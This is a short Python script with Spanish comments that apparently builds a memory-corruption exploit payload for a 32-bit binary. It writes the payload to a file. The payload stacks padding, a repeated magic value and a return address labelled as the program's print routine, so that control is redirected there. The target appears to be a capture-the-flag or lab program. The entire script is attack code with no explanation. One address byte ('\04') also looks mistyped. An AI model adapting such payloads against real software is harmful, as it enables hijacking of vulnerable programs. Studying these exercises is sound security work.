# 0xffffc4d4 // first read
# 0xffffc4d8 // second read
# 0x080484f1 // Direccion del print

exploit = b'\x02\x04\x00\x80'
exploit += b'\x42\x00\x00\x00' * 19
exploit += b'\x44\x43\x42\x41'
exploit += b'\x42\x00\x00\x00' * 980 # antes eran 1000
exploit += b'\xCE\xFA\xC0\xCA' * 24
exploit += b'\x01\x00\x00\x00'
exploit += b'\xf1\x84\04\x08'

f = open('asd2.txt', 'wb+')
f.write(exploit)
f.close()
